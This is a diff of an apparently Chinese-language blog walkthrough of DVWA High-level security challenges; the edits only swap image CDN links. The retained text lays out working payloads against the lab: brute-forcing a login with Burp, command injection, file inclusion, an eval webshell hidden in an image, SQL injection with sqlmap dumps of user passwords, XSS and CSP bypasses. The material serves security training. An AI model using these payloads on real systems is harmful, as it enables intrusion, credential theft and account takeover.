@@ -49,21 +49,21 @@ https://www.cnblogs.com/wrold/p/19664521
 High 难度新增**时间延迟**+**user_token 验证**，token 明文显示在前端页面，需动态提取 token 配合爆破。
 ### 利用步骤
 1. **抓包**：通过Burp Suite抓取登录请求包，可见`username`、`password`、`user_token`三个核心参数，token 为32位随机字符串。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303140843120.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303140843120.png)
 2. **定位token**：查看前端页面源码，token 藏在`<input type="hidden" name="user_token" value="xxx">`中，可通过正则匹配提取。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171351342.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303171351342.png)
 3. **Burp 配置**
    - 进入`Intruder`，选择**Pitchfork 交叉爆破**，标记`password`和`user_token`为爆破位置；
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171521377.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303171521377.png)
    - 进入`Settings`，开启**提取Grep项**，正则表达式配置为`value=(.*?)\/>\r\n`，匹配前端的token值；
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171551676.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303171551676.png)
    - 对`user_token`的Payload类型选择**递归提取**，并填入**初始请求的有效token**（抓包获取的原始token）。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171619770.png)
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171822505.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303171619770.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303171822505.png)
 4. **爆破设置**：将资源池发包最大次数改为**1**（禁止并发，避免token失效），加载密码字典开始爆破。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171646350.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303171646350.png)
 5. **结果分析**：按**响应长度排序**，长度与其他条目不同的即为正确密码（正确登录的响应页面与错误页面长度存在明显差异）。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171700267.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303171700267.png)
 
 ### 核心注意点
 抓包后**禁止提前发包**，否则token会刷新导致爆破失败，需保证初始token与爆破请求一致。
@@ -90,15 +90,15 @@ if(isset($_POST['Submit'])){
 }
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171906846.png)
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303171947996.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303171906846.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303171947996.png)
 ### 利用方法
 直接构造**无空格管道符拼接**的Payload，绕过滤黑名单位置：
 ```
 127.0.0.1|whoami
 ```
 提交后成功执行系统命令，返回当前用户信息。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172002703.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172002703.png)
 
 ---
 
@@ -107,9 +107,9 @@ if(isset($_POST['Submit'])){
 High 难度新增**user_token 验证**，token 明文显示在前端HTML源码中，单纯构造CSRF链接无法绕过，需**配合XSS漏洞提取token**后组合攻击。
 ### 漏洞分析
 1. 抓包修改密码请求，可见URL中包含`password_new`、`password_conf`、`user_token`参数，token为必填项。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172205628.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172205628.png)
 2. 查看前端源码，`user_token`藏在隐藏输入框中，攻击者无法直接获取受害者的token，但可通过XSS注入脚本**自动提取受害者的token**并拼接CSRF请求。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172211542.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172211542.png)
 ### 攻击思路
 1. 利用靶场中存在的XSS漏洞（如反射型、存储型），构造XSS脚本提取页面中的`user_token`；
 2. 将提取的token拼接至CSRF修改密码的URL中；
@@ -121,7 +121,7 @@ High 难度新增**user_token 验证**，token 明文显示在前端HTML源码�
 ### 漏洞特点
 High 难度对`page`参数做了**关键词白名单过滤**（仅允许包含`file`/`fie`），但未限制伪协议，可通过**file://伪协议**实现任意文件读取。
 ### 漏洞代码分析
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172251076.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172251076.png)
 ```php
 $file=$_GET['page'];
 if(!fnmatch("file,fie",$file)&&$file !="include.php"){
@@ -134,7 +134,7 @@ if(!fnmatch("file,fie",$file)&&$file !="include.php"){
 ```
 http://dvwa:8564/vulnerabilities/fi/?page=file://D:/1.php
 ```
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172309457.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172309457.png)
 
 ### 拓展利用
 若服务器开启`php://`伪协议相关配置，可结合`php://filter`实现源码读取：
@@ -148,7 +148,7 @@ http://dvwa:8564/vulnerabilities/fi/?page=php://filter/convert.base64-encode/res
 ### 漏洞特点
 High 难度做了**多重过滤**：文件类型校验、文件大小限制、`getimagesize()`图片头校验，无法直接上传webshell，需**制作图片马**配合**文件包含漏洞**实现webshell执行。
 ### 漏洞代码分析
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172608710.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172608710.png)
 ```php
 // 校验文件后缀、大小、是否为图片
 if((strtolower($uploaded_ext) in $allowed_ext)&&($uploaded_size<100000)&&getimagesize($uploaded_tmp)){
@@ -162,15 +162,15 @@ if((strtolower($uploaded_ext) in $allowed_ext)&&($uploaded_size<100000)&&getimag
    copy 1.png /b + shell.php /a 11.png
    ```
    图片马内容示例：`<?php phpinfo();?>`（测试用）/`<?php @eval($_POST['pass']);?>`（一句话webshell）。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172643878.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172643878.png)
 2. **上传图片马**：直接上传制作好的11.png，靶场提示上传成功，返回文件路径`../hackable/uploads/11.png`。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172654847.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172654847.png)
 3. **文件包含利用**：通过File Inclusion漏洞的`file://`伪协议，包含上传的图片马，执行PHP代码：
    ```
    http://dvwa:8564/vulnerabilities/fi/?page=file:///D:/phpstudy_pro/WWW/DVWA-master/hackable/uploads/11.png
    ```
    访问后成功执行`phpinfo()`，证明图片马生效。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172702955.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172702955.png)
 
 ### 核心注意点
 图片马必须**保留合法图片头**，否则`getimagesize()`会检测出非图片文件，导致上传失败。
@@ -187,19 +187,19 @@ High 难度新增**会话弹窗验证**，但注入核心逻辑未变，仍为**
 ### 利用步骤（手工注入）
 1. **判断注入类型**：
    - 输入`1`：正常返回数据；
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172912308.png)   
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172912308.png)   
    - 输入`1'`：页面报错，说明为**字符型注入**，需用单引号闭合，注释符`#`截断语句。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172933124.png)
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172942705.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172933124.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172942705.png)
 2. **验证注入点**：输入`1' and 1=1 #`，正常返回数据；输入`1' and 1=2 #`，无数据返回，注入点有效。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303172947691.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303172947691.png)
 3. **判断列数**：输入`1' order by 2 #`，正常返回；输入`1' order by 3 #`，报错，说明查询结果为**2列**。
 4. **联合注入提取数据**：
    - 提取数据库名：`-1' union select 1,database() #`
    - 提取表名：`-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`
    - 提取字段名：`-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`
    - 提取账号密码：`-1' union select user,password from users #`
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173049751.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173049751.png)
 ### 利用步骤（Sqlmap自动化注入）
 由于注入结果在**第二个页面**展示，需使用`--second-url`参数指定结果页面，命令如下：
 ```bash
@@ -208,7 +208,7 @@ sqlmap -r D:\Backup\桌面\1.txt --dbs --batch --second-url=http://dvwa:8564/vul
 # 读取users表数据
 sqlmap -r D:\Backup\桌面\1.txt -D dvwa -T users -C user,password --dump --batch --second-url=http://dvwa:8564/vulnerabilities/sqli/
 ```
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173204950.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173204950.png)
 执行后成功提取数据库中所有账号和加密后的密码。
 
 ---
@@ -216,7 +216,7 @@ sqlmap -r D:\Backup\桌面\1.txt -D dvwa -T users -C user,password --dump --batc
 ## 8. SQL Injection (Blind) — SQL 盲注
 ### 漏洞特点
 High 难度在时间盲注中加入**随机sleep延迟**（`rand(0,5)==3`时触发2-4秒延迟），导致时间盲注失效，仅能使用**布尔盲注**实现数据提取。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173222105.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173222105.png)
 ### 漏洞代码分析
 ```php
 else {
@@ -228,13 +228,13 @@ else {
 ```
 ### 利用步骤（Sqlmap自动化布尔盲注）
 1. **抓包**：抓取盲注请求包，发现注入点位于**Cookie的id参数**中（`id=1`）。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173251073.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173251073.png)
 2. **指定布尔盲注**：使用`--technique=B`参数强制Sqlmap使用布尔盲注，结合`--second-url`指定结果页面，命令如下：
 ```bash
 sqlmap -r D:\Backup\桌面\1.txt --dbs --batch --second-url="http://dvwa:8564/vulnerabilities/sqli_blind/" --technique=B
 ```
 3. **结果提取**：Sqlmap通过布尔盲注的页面回显差异，成功爆破出所有数据库名（dvwa、security、pikachu等）。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173316329.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173316329.png)
 
 ### 核心注意点
 请求包中有多个参数时，**避免同时标记多个注入点**，逐个测试定位真实注入点（本次为Cookie的id参数）。
@@ -258,7 +258,7 @@ High 难度的`dvwaSession`参数为**MD5加密的简单数字**，可通过MD5�
 ### 漏洞特点
 High 难度对`default`参数做了**白名单过滤**（仅允许French、English、German、Spanish），非白名单值会被重定向，可通过**#号**绕过服务器过滤（服务器不解析#后参数，前端DOM解析）。
 ### 漏洞代码分析
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173417052.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173417052.png)
 ```php
 if(array_key_exists("default",$_GET)&&!is_nulL($_GET['default'])){
     switch($_GET['default']){
@@ -276,7 +276,7 @@ if(array_key_exists("default",$_GET)&&!is_nulL($_GET['default'])){
 http://dvwa:8564/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
 ```
 访问后成功弹出弹窗，XSS利用成功。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173443287.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173443287.png)
 
 ---
 
@@ -284,7 +284,7 @@ http://dvwa:8564/vulnerabilities/xss_d/?default=English#<script>alert(1)</script
 ### 漏洞特点
 High 难度对`<script>`标签做了**严格的正则过滤**（匹配任意变种的script关键字，如ScRiPt、s<x>cript等），无法直接使用script标签，可通过**事件型XSS**绕过滤。
 ### 漏洞代码分析
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173453557.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173453557.png)
 ```php
 $name=preg_replace('/<(.*)s(.*)c(.*)(.)i(.*)p(.*)t/i',"",$_GET['name']);
 $html.="<pre>hello{$name}</pre>";
@@ -295,7 +295,7 @@ $html.="<pre>hello{$name}</pre>";
 <img src=x onerror=alert(1)>
 ```
 提交后成功弹出弹窗，XSS利用成功。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173505508.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173505508.png)
 
 ### 拓展Payload
 ```
@@ -309,7 +309,7 @@ $html.="<pre>hello{$name}</pre>";
 ### 漏洞特点
 High 难度对`message`字段做了**多重过滤**（`strip_tags`+`addslashes`+`htmlspecialchars`），完全无法注入；对`name`字段仅过滤`<script>`标签，可在`name`字段构造**事件型XSS**，并修改前端输入框限制实现长Payload输入。
 ### 漏洞代码分析
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173533479.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173533479.png)
 ```php
 // message字段严格过滤
 $message=strip_tags(addslashes( $message));
@@ -319,27 +319,27 @@ $name=preg_replace('/<(.*)s(.*)c(.*)i(.*)p(.*)t/i',"",$name);
 ```
 ### 利用步骤
 1. **修改前端输入限制**：`name`输入框默认有长度限制，通过浏览器开发者工具修改`maxlength`为**10000**，允许输入长Payload。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173548381.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173548381.png)
 2. **构造Payload**：在`name`字段输入`<img>`标签的onerror事件XSS Payload，`message`字段任意填写：
    ```
    <img src=x onerror=alert(1)>
    ```
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173556920.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173556920.png)
 3. **提交触发**：提交后留言簿中存储该Payload，任意用户访问留言簿页面时，自动弹出弹窗，存储型XSS利用成功。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173602044.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173602044.png)
 
 ---
 
 ## 13. CSP Bypass — CSP 绕过
 ### 漏洞特点
 High 难度配置了**内容安全策略（CSP）**，仅允许加载`self`（自身域名）的脚本，禁止外部脚本和未授权内联脚本，但靶场**自身代码存在逻辑漏洞**，可通过自身的JSONP接口绕过CSP。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173631677.png)
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173738131.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173631677.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173738131.png)
 ### 漏洞分析
 1. 查看响应头，CSP配置为：`Content-Security-Policy: script-src 'self'`。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173616634.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173616634.png)
 2. 发现靶场存在**JSONP接口**：`/vulnerabilities/csp/source/jsonp.php?callback=xxx`，该接口可接收任意callback参数并执行，且属于自身域名，符合CSP规则。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173653009.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173653009.png)
 3. 后端存在**任意代码写入漏洞**，`include`参数可直接写入HTML/JS代码，无过滤。
 ### 利用方法
 通过POST请求向`include`参数注入脚本，加载自身JSONP接口并执行XSS代码，Payload如下：
@@ -350,7 +350,7 @@ include=<script src="/vulnerabilities/csp/source/jsonp.php?callback=alert(1)"></
 1. 打开Burp Suite的Repeater，构造POST请求，目标URL：`http://dvwa:8564/vulnerabilities/csp/`；
 2. 请求体为`application/x-www-form-urlencoded`，参数：`include=<script src="/vulnerabilities/csp/source/jsonp.php?callback=alert(1)"></script>`；
 3. 发送请求后，成功弹出弹窗，CSP绕过成功。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173751208.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173751208.png)
 
 ---
 
@@ -358,7 +358,7 @@ include=<script src="/vulnerabilities/csp/source/jsonp.php?callback=alert(1)"></
 ### 漏洞特点
 High 难度通过**JavaScript加密算法**生成`token`，需提交正确的`phrase`+`token`才能通过验证，核心为分析加密逻辑并还原`token`生成过程。
 ### 加密逻辑分析
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173801899.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173801899.png)
 通过Burp抓包获取混淆的JS代码，**反混淆**后得到3个核心加密函数，执行顺序为：`token_part_1` → `token_part_2`（300ms延时） → `token_part_3`（点击提交触发）。
 #### 反混淆后核心JS代码
 ```javascript
@@ -385,19 +385,19 @@ setTimeout(function() {token_part_2("XX")}, 300);
 document.getElementById("send").addEventListener("click", token_part_3);
 token_part_1("ABCD", 44);
 ```
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173834572.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173834572.png)
 ### 利用方法（两种）
 #### 方法1：前端控制台手动执行加密函数
 1. 在输入框中填入正确的`phrase`：`success`；
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173858457.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173858457.png)
 2. 打开浏览器开发者工具控制台，按顺序执行加密函数：
    ```javascript
    token_part_1("ABCD", 44);
    token_part_2("XX");
    ```
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173908224.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173908224.png)
 3. 点击**提交按钮**，触发`token_part_3`生成最终token，验证成功。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173918617.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173918617.png)
 
 #### 方法2：Python脚本还原加密过程，直接生成token
 通过Python实现字符串反转+SHA256加密，直接生成最终token，构造POST请求提交。
@@ -432,10 +432,10 @@ if __name__ == "__main__":
     print(f"POST数据: phrase={phrase}&send=Submit&token={token}")
 ```
 ##### 执行脚本
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173945078.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173945078.png)
 运行后生成最终token，通过Burp构造POST请求提交，验证成功。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303173956836.png)
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174004314.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303173956836.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303174004314.png)
 
 ---
 
@@ -443,10 +443,10 @@ if __name__ == "__main__":
 ### 漏洞特点
 High 难度对前端页面做了**管理员权限校验**（非admin用户访问提示403），但对**后端接口文件`change_user_details.php`未做鉴权**，可直接发送JSON请求修改任意用户信息。
 ### 漏洞代码分析
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174017788.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303174017788.png)
 ```php
 // 前端页面权限校验
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174017788.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303174017788.png)
 if (dvwaCurrentUser() !="admin"){
     print "Unauthorised";
     http_response_code(403);
@@ -463,9 +463,9 @@ if (dvwaCurrentUser() !="admin"){
    ```json
    {"id":3,"first_name":"hacked","surname":"hacked"}
    ```
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174058618.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303174058618.png)
 4. 发送请求后，返回`{"result":"ok"}`，用户信息修改成功。
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174102999.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303174102999.png)
 
 ---
 
@@ -485,7 +485,7 @@ if (array_key_exists("redirect",$_GET) && $_GET['redirect']!=""){
     }
 }
 ```
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174119561.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260303174119561.png)
 ### 利用方法
 构造**包含info.php的恶意URL**，绕过滤后将受害者重定向到钓鱼网站/恶意站点，核心Payload示例：
 ```
